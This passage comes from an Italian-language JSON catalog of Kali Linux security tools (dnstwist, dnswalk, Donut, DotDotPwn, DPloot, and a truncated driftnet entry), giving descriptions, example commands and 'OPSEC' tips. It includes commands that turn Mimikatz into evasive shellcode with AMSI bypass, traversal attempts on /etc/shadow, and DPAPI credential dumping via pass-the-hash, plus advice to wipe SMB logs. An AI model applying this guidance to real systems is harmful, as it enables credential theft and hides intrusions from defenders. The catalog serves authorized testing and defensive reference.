    "repo": "https://www.kali.org/tools/dnstwist/",
    "desc": "Trova domini typosquatting e phishing simili al tuo brand.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNStwist</strong> e un potente strumento di threat intelligence specializzato nell'individuazione di domini utilizzati per typosquatting, phishing e impersonificazione di brand. Il tool genera sistematicamente permutazioni del dominio target utilizzando oltre 15 algoritmi differenti, tra cui errori di battitura comuni (typo), sostituzione con caratteri visivamente simili (homoglyph), bitsquatting, inserzione, omissione, trasposizione e ripetizione di caratteri. Per ogni permutazione generata, DNStwist verifica se il dominio risultante e effettivamente registrato e attivo, raccogliendo informazioni aggiuntive come record DNS, dati WHOIS, indirizzi IP, certificati TLS e persino screenshot delle pagine web. Questo lo rende uno strumento essenziale sia per la protezione proattiva del brand che per le indagini di threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Algoritmi di Fuzzing Multipli:</strong> DNStwist implementa piu di 15 algoritmi di permutazione per generare varianti plausibili del dominio target. Tra questi, il bitsquatting simula errori hardware nella memoria (bit flip), l'homoglyph detection utilizza caratteri Unicode visivamente identici alle lettere latine (come la 'a' cirillica al posto della 'a' latina), e gli algoritmi di typo simulano errori di battitura basati sulla disposizione dei tasti sulla tastiera. Questa copertura ampia massimizza la probabilita di scoprire domini malevoli.</p><p><strong>Intelligence Gathering Integrato:</strong> Per ogni dominio registrato trovato, DNStwist raccoglie automaticamente una ricca serie di informazioni: record DNS (A, AAAA, MX, NS), dati WHOIS (registrant, date di registrazione), geolocalizzazione degli IP tramite GeoIP, e verifica dei certificati TLS. Puo inoltre calcolare la similarita del contenuto web con il sito originale tramite fuzzy hashing (ssdeep), identificando cloni attivi utilizzati per campagne di phishing.</p><p><strong>Screenshot e Reporting:</strong> La funzionalita di screenshot cattura automaticamente l'aspetto visivo dei siti sospetti trovati, permettendo un'analisi rapida senza necessita di visitare manualmente ogni dominio potenzialmente pericoloso. I risultati possono essere esportati in formati JSON, CSV e lista semplice, facilitando l'integrazione con piattaforme SIEM, sistemi di ticketing e workflow di incident response.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNStwist si utilizza specificando il dominio da proteggere come argomento principale. Le opzioni aggiuntive controllano il livello di intelligence gathering e il formato di output. Per analisi complete si consiglia di abilitare tutte le opzioni di raccolta dati.</p><pre><code># Scansione base con output tabellare\ndnstwist example.com\n\n# Analisi completa con screenshot e output JSON\ndnstwist --screenshots shots/ -f json example.com > results.json\n\n# Include dati WHOIS, verifica MX e banner HTTP\ndnstwist --whois --mxcheck --banners example.com\n\n# Filtra solo domini effettivamente registrati\ndnstwist --registered example.com\n\n# Fuzzy hashing per rilevare cloni del sito\ndnstwist --ssdeep example.com\n\n# Scansione con tutti i moduli attivi\ndnstwist --registered --whois --mxcheck --banners --ssdeep example.com</code></pre><p>I risultati possono essere utilizzati per creare watchlist nei sistemi di monitoraggio DNS, configurare regole di blocco nei proxy aziendali, o alimentare piattaforme di threat intelligence per correlazione con altri indicatori di compromissione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>Brand Protection</strong> aziendale, DNStwist permette di identificare proattivamente domini registrati da terzi che imitano il brand dell'organizzazione. Questi domini vengono tipicamente utilizzati per campagne di phishing, distribuzione di malware o frodi finanziarie. La scansione periodica automatizzata permette di rilevare nuove minacce tempestivamente e avviare procedure di takedown.</p><p>Nella <strong>Threat Intelligence</strong>, il tool supporta l'analisi di campagne di typosquatting su larga scala. Correlando i domini trovati con dati WHOIS, IP e hosting, e possibile identificare pattern di registrazione, infrastruttura condivisa tra campagne diverse e attori di minaccia ricorrenti. L'integrazione con feed di threat intelligence amplifica ulteriormente le capacita di detection.</p><p>Per i <strong>Blue Team</strong> e i SOC, DNStwist fornisce la base per creare watchlist di domini sospetti da monitorare nei log DNS aziendali, nei proxy web e nei sistemi di email filtering. L'identificazione precoce di domini di phishing prima che vengano utilizzati in campagne attive rappresenta un vantaggio significativo nella difesa proattiva.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DNStwist e primariamente uno strumento difensivo e le sue attivita sono generalmente considerate legittime. Le query DNS e WHOIS generate sono operazioni standard e non sollevano allarmi. Tuttavia, un volume elevato di query WHOIS in breve tempo potrebbe essere rate-limited dai registrar. Le query DNS per permutazioni inesistenti generano risposte NXDOMAIN che sono normali nel traffico DNS.</p><p><strong>Impatto operativo:</strong> L'impatto e minimo poiche il tool interroga solo server DNS pubblici e database WHOIS. La funzionalita di screenshot richiede connessioni HTTP dirette ai domini sospetti, il che potrebbe rivelare l'IP dell'analista ai gestori di quei domini. Per domini di phishing attivi, questa connessione potrebbe essere monitorata dagli attori di minaccia.</p><p><strong>Mitigazioni:</strong> Utilizzare una VPN o un proxy per le connessioni HTTP durante la cattura degli screenshot. Per scansioni regolari automatizzate, distribuire le query WHOIS nel tempo per evitare rate limiting. Considerare l'uso di API di terze parti (SecurityTrails, DomainTools) per raccogliere dati WHOIS senza query dirette ai registrar.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Domain_Recon"
    ],
    "notes": null
  },
  {
    "id": "dnswalk",
    "name": "dnswalk",
    "version": "2.0.2.dfsg.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnswalk/",
    "desc": "Debugger DNS che verifica configurazioni di zona e problemi comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSwalk</strong> e un debugger e auditor DNS scritto in Perl che esegue zone transfer e analizza automaticamente la configurazione delle zone DNS alla ricerca di problemi comuni e misconfigurazioni. Il tool controlla sistematicamente la coerenza dei record DNS, identificando record orfani (record A senza corrispondente PTR), CNAME chain e loop, delegation inconsistencies, lame delegations, e altri errori che possono indicare una cattiva gestione dell'infrastruttura DNS. Originariamente sviluppato come strumento di amministrazione, DNSwalk si e rivelato prezioso anche nel contesto della sicurezza offensiva, poiche le misconfigurazioni DNS rappresentano spesso vettori di attacco sfruttabili o fonti di information disclosure non intenzionale. Il tool richiede che il server DNS target permetta i zone transfer, una condizione sempre piu rara ma ancora presente in alcune organizzazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Zone Analysis Completa:</strong> DNSwalk analizza l'intera zona DNS dopo aver effettuato un zone transfer, verificando la correttezza sintattica e semantica di ogni record. Controlla che i record SOA siano configurati correttamente, che i serial number siano coerenti tra nameserver primario e secondari, che i valori di refresh, retry ed expire siano ragionevoli, e che non esistano record con valori anomali o potenzialmente pericolosi. Questa analisi sistematica rivela problemi che spesso sfuggono a controlli manuali.</p><p><strong>Verifica Consistenza PTR e Forward:</strong> Il tool confronta sistematicamente i record A (forward lookup) con i corrispondenti record PTR (reverse lookup), identificando discrepanze che possono indicare configurazioni obsolete, server dismessi ma non rimossi dal DNS, o indirizzi IP riassegnati senza aggiornamento dei record inversi. Questa verifica bidirezionale e fondamentale per mantenere l'integrita della zona DNS.</p><p><strong>Delegation e CNAME Validation:</strong> DNSwalk controlla che tutte le deleghe a sottozone siano valide, verificando che i nameserver delegati esistano e rispondano correttamente. Identifica le cosiddette lame delegations, dove un nameserver e indicato come autoritativo ma non ha effettivamente la zona configurata. Per i record CNAME, verifica che non esistano chain eccessive o loop circolari che possono causare problemi di risoluzione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNSwalk si invoca da linea di comando specificando il dominio da analizzare. E importante notare che il dominio deve terminare con un punto (trailing dot) secondo la convenzione DNS per i nomi fully qualified. Il tool tenta automaticamente il zone transfer prima di procedere con l'analisi.</p><pre><code># Analisi standard della zona (nota: trailing dot obbligatorio)\ndnswalk target.com.\n\n# Modalita debug con output dettagliato\ndnswalk -d target.com.\n\n# Forza zone transfer ricorsivo sulle subzone\ndnswalk -r target.com.\n\n# Check ricorsivo con analisi delle subzone delegate\ndnswalk -r -a target.com.\n\n# Analisi con lookup di tutti gli indirizzi\ndnswalk -F target.com.\n\n# Combinazione di opzioni per analisi approfondita\ndnswalk -r -d -F target.com.</code></pre><p>L'output di DNSwalk classifica i problemi trovati per severita, utilizzando indicatori come WARNING per problemi minori e ERROR per configurazioni critiche. E consigliabile analizzare attentamente ogni segnalazione nel contesto specifico dell'organizzazione target, poiche alcune configurazioni apparentemente errate potrebbero essere intenzionali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto del <strong>DNS Auditing</strong> durante un penetration test, DNSwalk permette di ottenere una fotografia completa della configurazione DNS del target e identificare rapidamente misconfigurazioni sfruttabili. Record orfani possono rivelare server dismessi ancora raggiungibili, delegation errate possono permettere zone takeover, e record con informazioni troppo dettagliate possono fornire intelligence sulla struttura interna della rete.</p><p>Per la <strong>Reconnaissance</strong> approfondita, il zone transfer (quando disponibile) combinato con l'analisi automatica di DNSwalk rivela l'intera topologia DNS dell'organizzazione, inclusi host interni, ambienti di test, server di backup e altri asset che l'organizzazione potrebbe non voler esporre. Le lame delegations possono inoltre indicare sottodomini abbandonati potenzialmente vulnerabili a subdomain takeover.</p><p>I <strong>Blue Team</strong> utilizzano DNSwalk come strumento di audit periodico per verificare la propria infrastruttura DNS, assicurandosi che non esistano record obsoleti, deleghe interrotte o configurazioni che potrebbero essere sfruttate da un attaccante. L'automazione di queste verifiche contribuisce a mantenere un'igiene DNS adeguata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DNSwalk richiede zone transfer (AXFR) come prerequisito fondamentale per il suo funzionamento. I tentativi di zone transfer sono quasi universalmente loggati dai server DNS e spesso generano alert automatici nei sistemi di monitoraggio, poiche rappresentano un'operazione anomala raramente eseguita da client legittimi. Il tentativo stesso, anche se fallisce, viene registrato.</p><p><strong>Impatto operativo:</strong> Su server DNS moderni e correttamente configurati, il zone transfer sara rifiutato, rendendo il tool inefficace. Quando il transfer e permesso, il volume di dati trasferiti e le query aggiuntive di verifica generano traffico DNS significativo e facilmente distinguibile dal traffico normale. L'analisi ricorsiva delle subzone amplifica ulteriormente il volume di traffico.</p><p><strong>Mitigazioni:</strong> Prima di utilizzare DNSwalk, verificare con una semplice query AXFR manuale se il zone transfer e permesso, evitando di eseguire il tool completo su target che non lo supportano. Per operazioni sensibili, considerare l'uso di tecniche alternative come DNSSEC zone walking o brute force passivo che non richiedono zone transfer. Se il zone transfer e disponibile, eseguire l'analisi in orari di basso traffico per ridurre la visibilita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "donut-shellcode",
    "name": "donut-shellcode",
    "version": "1.1",
    "icon": "../app/icons/donut-shellcode-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/donut-shellcode/",
    "desc": "Converte .NET, PE, VBS in shellcode position-independent per injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Donut</strong> e un generatore avanzato di shellcode position-independent (PIC) che converte assembly .NET, eseguibili PE nativi (EXE e DLL), script VBScript e JScript in payload shellcode iniettabili in memoria. Il payload risultante e completamente autocontenuto: include un loader che carica ed esegue il modulo originale interamente in memoria, senza mai scrivere nulla su disco. Donut implementa il caricamento in-memory del Common Language Runtime (CLR) per gli assembly .NET e un PE loader custom per gli eseguibili nativi, gestendo le relocation, le import table e l'inizializzazione del modulo. Supporta inoltre cifratura del payload con Chaskey block cipher, compressione con aPLib, bypass automatico di AMSI (Antimalware Scan Interface) e WLDP (Windows Lockdown Policy), rendendolo uno strumento fondamentale nell'arsenale di red team per la creazione di payload evasivi e l'esecuzione fileless di strumenti offensivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Conversione .NET e PE:</strong> Donut supporta la conversione di qualsiasi assembly .NET (sia EXE che DLL) in shellcode, gestendo automaticamente l'inizializzazione del CLR, il caricamento dell'AppDomain e l'invocazione del metodo di entry point. Per gli eseguibili PE nativi, implementa un loader completo che gestisce relocation, risoluzione delle import, TLS callbacks e inizializzazione delle sezioni. Supporta anche DLL con entry point custom specificabili dall'utente, permettendo l'esecuzione di funzioni esportate specifiche.</p><p><strong>Cifratura e Compressione:</strong> Il payload generato puo essere cifrato con il block cipher Chaskey, con chiave generata casualmente e inclusa nello stub di decifratura. Questo impedisce l'analisi statica del contenuto e rende ogni generazione unica. La compressione con aPLib riduce significativamente le dimensioni del payload, facilitando il trasporto e l'iniezione. Le due tecniche possono essere combinate per massimizzare sia l'evasione che l'efficienza.</p><p><strong>Bypass AMSI/WLDP e Parametri Runtime:</strong> Donut include moduli di bypass integrati per AMSI e WLDP, le due principali tecnologie Microsoft per il controllo dell'esecuzione di codice dinamico in memoria. Il bypass AMSI impedisce la scansione del payload .NET al momento del caricamento nel CLR, mentre il bypass WLDP aggira le policy che limitano l'esecuzione di script e COM objects. Il tool permette inoltre di specificare parametri da linea di comando per l'eseguibile convertito, che vengono passati al momento dell'esecuzione in memoria.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Donut si utilizza da linea di comando specificando il file da convertire e le opzioni desiderate per cifratura, compressione e bypass. Il risultato e un file binario contenente lo shellcode pronto per l'iniezione tramite un loader appropriato.</p><pre><code># Conversione base di un assembly .NET\ndonut -f mimikatz.exe -o payload.bin\n\n# Con cifratura Chaskey e compressione aPLib\ndonut -f payload.exe -o shell.bin -e 3 -z 2\n\n# DLL con entry point specifico\ndonut -f evil.dll -m DllMain -o shell.bin\n\n# Passaggio parametri all'eseguibile\ndonut -f rubeus.exe -p \"kerberoast /outfile:hashes.txt\" -o rubeus.bin\n\n# Assembly .NET con class e method specifici\ndonut -f sharpkatz.exe -c SharpKatz.Program -m Main -o katz.bin\n\n# Bypass AMSI e WLDP con exit thread (non exit process)\ndonut -f seatbelt.exe -e 3 -z 2 -x 2 -o seatbelt.bin</code></pre><p>Lo shellcode generato deve essere iniettato tramite un loader custom o integrato in un framework come Cobalt Strike, Sliver o Havoc. Il flag -x controlla il comportamento all'uscita: -x 1 termina il processo, -x 2 termina solo il thread, importante per evitare di crashare il processo host.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Red Teaming</strong>, Donut e lo strumento standard per convertire tool offensivi come Mimikatz, Rubeus, Seatbelt e SharpHound in shellcode per esecuzione fileless. Questo permette di caricare ed eseguire questi strumenti interamente in memoria attraverso un beacon C2, senza mai scrivere i file su disco dove potrebbero essere rilevati da soluzioni antivirus o EDR basate su firma.</p><p>Per lo <strong>sviluppo di payload</strong> personalizzati, Donut fornisce la base per creare catene di delivery complesse. Lo shellcode generato puo essere incorporato in loader custom scritti in C, C++, Go o Rust, combinato con tecniche di injection avanzate (process hollowing, early bird injection, module stomping) e wrapped in diversi formati di delivery (macro Office, HTA, script PowerShell).</p><p>Nell'ambito dell'<strong>evasione antivirus</strong>, la combinazione di cifratura, compressione e esecuzione in-memory offerta da Donut rappresenta il primo livello di evasione. Quando combinato con loader custom che implementano tecniche aggiuntive come syscall dirette, unhooking di DLL e offuscamento del flusso di controllo, raggiunge livelli di evasione significativi contro soluzioni EDR enterprise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo shellcode generato da Donut ha signature conosciute che vengono rilevate da diversi motori antivirus e soluzioni EDR. Lo stub di decifratura e il loader CLR in-memory presentano pattern identificabili tramite analisi statica e behavioral analysis. Le soluzioni EDR piu avanzate rilevano il caricamento dinamico del CLR e il patching di AMSI come indicatori di attivita malevola, indipendentemente dal contenuto del payload.</p><p><strong>Impatto operativo:</strong> L'esecuzione di shellcode Donut lascia tracce in memoria che possono essere identificate tramite memory scanning. Il caricamento del CLR in un processo che normalmente non lo utilizza e un indicatore forte di anomalia. I bypass AMSI, se implementati tramite patching in-memory, possono essere rilevati da soluzioni che monitorano l'integrita delle funzioni di AMSI.</p><p><strong>Mitigazioni:</strong> Utilizzare encoding aggiuntivo o cifratura custom sopra lo shellcode generato da Donut per evitare il rilevamento dello stub. Implementare loader custom con syscall dirette per l'iniezione, evitando le API user-mode monitorate. Scegliere processi host appropriati che caricano normalmente il CLR (come powershell.exe o applicazioni .NET) per ridurre le anomalie. Considerare alternative come in-memory .NET loading custom o loader PE sviluppati internamente per operazioni ad alto profilo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "dotdotpwn",
    "name": "dotdotpwn",
    "version": "3.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dotdotpwn/",
    "desc": "Fuzzer per directory traversal su HTTP, FTP, TFTP, payload multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DotDotPwn</strong> e un fuzzer automatizzato specializzato nell'identificazione di vulnerabilita di directory traversal (note anche come path traversal) in applicazioni web e servizi di rete. Il tool genera e testa sistematicamente centinaia di varianti di payload di traversal su diversi protocolli, tra cui HTTP, HTTPS, FTP e TFTP, cercando di accedere a file sensibili del sistema operativo come /etc/passwd su Linux o boot.ini su Windows. La forza principale di DotDotPwn risiede nella sua capacita di applicare automaticamente encoding multipli ai payload, tra cui URL encoding, double URL encoding, codifica Unicode e null byte injection, per bypassare filtri e meccanismi di sanitizzazione implementati dall'applicazione target. Scritto in Perl, il tool e altamente configurabile e permette di personalizzare profondita di traversal, file target, e modalita di rilevamento del successo.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Multi-Protocol Support:</strong> DotDotPwn supporta nativamente diversi protocolli e modalita di test. La modalita HTTP testa directory traversal su URL e parametri GET/POST, la modalita FTP verifica comandi come RETR e CWD, la modalita TFTP tenta il download di file tramite traversal, e la modalita payload permette di generare liste di payload per uso con altri tool. Ogni modalita e ottimizzata per le specifiche del protocollo, massimizzando le probabilita di successo.</p><p><strong>Encoding e Bypass Techniques:</strong> Il tool implementa automaticamente diverse tecniche di encoding per aggirare i filtri di sicurezza: URL encoding semplice (%2e%2e%2f), double encoding (%252e%252e%252f), encoding Unicode (%u002e%u002e%u002f), null byte injection (..%00/), e combinazioni multiple di queste tecniche. Questo approccio sistematico permette di scoprire vulnerabilita che sfuggono a test manuali, dove l'operatore potrebbe non considerare tutte le possibili varianti di encoding.</p><p><strong>Configurazione Profondita e File Target:</strong> L'utente puo controllare la profondita massima di traversal (numero di livelli ../), specificare file target personalizzati da cercare, definire pattern di successo custom per il rilevamento, e configurare il comportamento del fuzzer in termini di timeout e concorrenza. La modalita URL permette inoltre di specificare esattamente il punto di iniezione nell'URL tramite il placeholder TRAVERSAL, offrendo controllo preciso sul punto di test.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DotDotPwn si utilizza specificando la modalita di test, il target e le opzioni di configurazione. Il tool procede automaticamente a testare tutte le combinazioni di payload e encoding, riportando i tentativi riusciti.</p><pre><code># Test directory traversal su server HTTP\ndotdotpwn -m http -h target.com\n\n# Test su FTP con profondita 8 livelli\ndotdotpwn -m ftp -h target.com -d 8\n\n# Test su URL specifica con punto di iniezione\ndotdotpwn -m http-url -u 'http://target.com/page.php?file=TRAVERSAL'\n\n# Cerca un file specifico (/etc/shadow)\ndotdotpwn -m http -h target.com -f /etc/shadow\n\n# Genera solo i payload senza eseguire test\ndotdotpwn -m payload -o payloads.txt\n\n# Test con protocollo TFTP\ndotdotpwn -m tftp -h target.com</code></pre><p>Il tool segnala come positivi i tentativi dove la risposta contiene pattern indicativi del file cercato (ad esempio le righe di /etc/passwd). E importante verificare manualmente i risultati positivi, poiche possono verificarsi falsi positivi in caso di pagine di errore personalizzate o risposte inaspettate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per il <strong>testing LFI</strong> (Local File Inclusion) in applicazioni web, DotDotPwn automatizza la discovery di vulnerabilita di path traversal che potrebbero sfuggire a test manuali. La copertura sistematica di tutti gli encoding possibili e particolarmente utile contro applicazioni che implementano filtri di sanitizzazione parziali, dove solo specifiche combinazioni di encoding riescono a bypassare le protezioni.</p><p>Nel <strong>Web Penetration Testing</strong> professionale, il tool accelera significativamente la fase di vulnerability assessment per le vulnerabilita di directory traversal. Anziche testare manualmente decine di varianti su ogni parametro, DotDotPwn esegue il test completo in pochi minuti, liberando il pentester per l'analisi e lo sfruttamento dei risultati.</p><p>In ambito <strong>CTF</strong> (Capture The Flag), DotDotPwn e frequentemente utilizzato per risolvere rapidamente challenge web che coinvolgono LFI o path traversal, dove la soluzione richiede di individuare la specifica combinazione di encoding che bypassa il filtro implementato nella challenge.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DotDotPwn genera un volume molto elevato di richieste HTTP anomale contenenti pattern di directory traversal facilmente riconoscibili. Qualsiasi WAF (Web Application Firewall), IDS o sistema di log analysis rileverebbe immediatamente questa attivita. I pattern come ../, %2e%2e%2f e le loro varianti sono tra le signature piu comuni in qualsiasi ruleset di sicurezza web.</p><p><strong>Impatto operativo:</strong> Il volume di richieste generate puo causare stress significativo sul server web target e potrebbe attivare meccanismi di rate limiting o ban automatico dell'IP sorgente. In ambienti con WAF aggressivi, l'IP potrebbe essere bloccato dopo poche richieste, rendendo inefficace il resto del test e compromettendo potenzialmente altre attivita di testing in corso dalla stessa sorgente.</p><p><strong>Mitigazioni:</strong> Per penetration test autorizzati, coordinare con il cliente per whitelistare l'IP sorgente nei sistemi WAF/IDS durante la finestra di test. In contesti dove la discrezione e necessaria, evitare DotDotPwn e procedere con test manuali mirati basati sull'analisi del codice o del comportamento dell'applicazione. Utilizzare proxy rotanti e introdurre delay significativi tra le richieste per ridurre la visibilita, accettando tempi di test molto piu lunghi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "dploot",
    "name": "dploot",
    "version": "3.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dploot/",
    "desc": "Estrae credenziali DPAPI da Windows: browser passwords, WiFi, certificates.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DPloot</strong> e uno strumento Python specializzato nell'estrazione remota di credenziali e segreti protetti dal Data Protection API (DPAPI) di Windows. DPAPI e il meccanismo utilizzato da Windows per cifrare dati sensibili degli utenti, tra cui password salvate nei browser, credenziali WiFi, certificati personali, credenziali del Credential Manager e molto altro. DPloot opera interamente via protocollo SMB, connettendosi al target remoto e accedendo ai file DPAPI necessari senza richiedere l'installazione di alcun agente o l'esecuzione di codice sulla macchina target. Il tool gestisce automaticamente il recupero e la decifratura delle DPAPI master key utilizzando le credenziali o gli hash forniti dall'operatore, rendendo l'intero processo di estrazione trasparente e automatizzato. Sviluppato come evoluzione moderna di strumenti precedenti, DPloot e diventato uno dei tool di riferimento per il credential harvesting in ambito Active Directory.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione Credenziali Browser:</strong> DPloot recupera e decifra le password salvate nei principali browser su Windows, inclusi Google Chrome, Microsoft Edge (Chromium), e Firefox. Per Chrome e Edge, gestisce la decifratura del database SQLite delle credenziali utilizzando le chiavi DPAPI dell'utente, inclusa la nuova protezione con chiave AES in versioni recenti. Per Firefox, accede ai profili e decifra il database delle credenziali. Questo modulo e particolarmente efficace poiche le password del browser spesso includono credenziali per applicazioni aziendali, servizi cloud e sistemi interni.</p><p><strong>DPAPI Master Key Recovery:</strong> Il cuore di DPloot e la capacita di recuperare e decifrare le DPAPI master key degli utenti. Con credenziali di dominio o l'hash NTLM di un utente, il tool puo decifrare le master key locali o richiedere il backup key al Domain Controller (per ambienti Active Directory). Una volta ottenute le master key, tutti i dati protetti da DPAPI per quell'utente diventano accessibili. Il tool supporta anche l'uso diretto della DPAPI domain backup key per decifrare le master key di tutti gli utenti del dominio.</p><p><strong>WiFi, Certificati e Vault:</strong> Oltre alle credenziali browser, DPloot estrae password WiFi salvate nei profili di rete Windows, certificati personali con le relative chiavi private (utilizzabili per autenticazione, firma o decifratura), e le credenziali memorizzate nel Windows Credential Manager (vault). I certificati estratti possono essere particolarmente preziosi per il lateral movement tramite autenticazione certificate-based o per la decifratura di comunicazioni cifrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DPloot si utilizza specificando il modulo di estrazione desiderato, le credenziali per l'autenticazione e il target. Richiede privilegi di amministratore locale sul target per accedere ai file DPAPI nei profili utente.</p><pre><code># Estrazione credenziali browser con password\ndploot browser -u admin -p 'P@ssw0rd' -d domain.local 192.168.1.10\n\n# Estrazione password WiFi\ndploot wifi -u admin -p 'P@ssw0rd' -d domain.local target\n\n# Dump certificati e chiavi private\ndploot certificates -u admin -p 'P@ssw0rd' target\n\n# Autenticazione con hash NTLM (pass-the-hash)\ndploot browser -u admin -H aad3b435b51404eeaad3b435b51404ee:hash target\n\n# Estrazione credenziali Vault/Credential Manager\ndploot credentials -u admin -p 'P@ssw0rd' target\n\n# Uso della domain backup key per decifrare tutti gli utenti\ndploot browser -u admin -p 'P@ssw0rd' --pvk domain_backup.pvk target</code></pre><p>Per massimizzare i risultati, e consigliabile eseguire tutti i moduli di estrazione disponibili su ogni target compromesso. Le credenziali recuperate dai browser spesso forniscono accesso a sistemi aggiuntivi, alimentando il ciclo di lateral movement.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Post-Exploitation</strong> durante penetration test in ambienti Active Directory, DPloot e uno degli strumenti piu efficaci per il credential harvesting. Le password salvate nei browser spesso includono credenziali per applicazioni web interne, portali VPN, servizi cloud (Office 365, AWS Console), sistemi di ticketing e altre risorse che ampliano significativamente la superficie di attacco accessibile al pentester.</p><p>Per la <strong>Privilege Escalation</strong> e il lateral movement, le credenziali estratte da DPloot frequentemente rivelano password riutilizzate su sistemi multipli. Un utente che salva la password del suo account di dominio nel browser fornisce un percorso diretto per l'escalation. I certificati estratti possono essere utilizzati per autenticazione Kerberos via PKINIT, un vettore spesso non monitorato.</p><p>Nell'ambito dell'<strong>AD Pentesting</strong> completo, DPloot si integra nel workflow post-exploitation come fase di raccolta credenziali sistematica. Combinato con strumenti come BloodHound per l'analisi dei percorsi di attacco e CrackMapExec per l'esecuzione distribuita, permette di massimizzare l'estrazione di credenziali su tutti i sistemi compromessi in modo efficiente e scalabile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DPloot genera traffico SMB significativo durante l'accesso ai profili utente sul target, incluso l'accesso a directory specifiche come AppData/Roaming/Microsoft/Protect (master key DPAPI) e AppData/Local/Google/Chrome/User Data (credenziali browser). Soluzioni EDR che monitorano l'accesso a questi percorsi tramite SMB possono rilevare l'attivita. L'accesso al backup key DPAPI sul Domain Controller genera eventi specifici nei log di sicurezza.</p><p><strong>Impatto operativo:</strong> L'operazione richiede privilegi di amministratore locale sul target, il che implica che la compromissione iniziale e gia avvenuta. L'accesso SMB ai profili di tutti gli utenti genera un volume di traffico di rete proporzionale al numero di profili presenti, potenzialmente significativo su workstation utilizzate da piu utenti. Le connessioni SMB vengono registrate nei log di sicurezza del target.</p><p><strong>Mitigazioni:</strong> Limitare l'estrazione ai profili di utenti specifici di interesse anziche eseguire un dump completo di tutti i profili. Operare durante orari di basso monitoraggio e da un sistema gia presente nella rete per ridurre l'anomalia del traffico SMB. Considerare l'uso di timestomping sulle connessioni e la pulizia dei log SMB sul target dopo l'operazione. Per ambienti con EDR avanzati, valutare l'estrazione manuale dei file DPAPI e la decifratura offline.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "driftnet",
    "name": "driftnet",
    "version": "1.5.0",
    "icon": "../app/icons/driftnet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/driftnet/",
    "desc": "Cattura immagini e media dal traffico di rete in tempo reale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Driftnet</strong> e uno sniffer di rete specializzato nell'estrazione e visualizzazione in tempo reale di contenuti multimediali dal traffico di rete. A differenza degli sniffer tradizionali che si concentrano su pacchetti e protocolli, Driftnet ricostruisce i flussi TCP per estrarre immagini (JPEG, GIF, PNG), stream audio MPEG e altri contenuti binari dal traffico HTTP non cifrato che transita sull'interfaccia di rete monitorata. Il tool puo visualizzare le immagini catturate in tempo reale in una finestra grafica X11, oppure salvarle automaticamente su disco per analisi successive. Originariamente sviluppato come dimostrazione delle implicazioni sulla privacy del traffico non cifrato, Driftnet rimane uno strumento efficace per analisi di rete, demo di security awareness e scenari di penetration testing dove il traffico HTTP in chiaro e ancora presente, come reti interne legacy o dispositivi IoT.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione Immagini dal Traffico:</strong> Driftnet ricostruisce i flussi TCP e identifica i contenuti multimediali analizzando i magic bytes e gli header dei file. Supporta l'estrazione di immagini JPEG, GIF e PNG dal traffico HTTP, ricostruendo i file anche quando i dati sono frammentati su pacchetti multipli. Il processo di ricostruzione e robusto e gestisce correttamente connessioni HTTP persistenti (keep-alive) e transfer-encoding chunked, massimizzando il numero di immagini estratte con successo.</p><p><strong>Visualizzazione Real-Time e Salvataggio:</strong> La modalita interattiva mostra le immagini catturate in una finestra grafica aggiornata in tempo reale, fornendo una visualizzazione immediata di cio che transita sulla rete. La modalita adjunct (-a) disabilita la visualizzazione grafica e salva 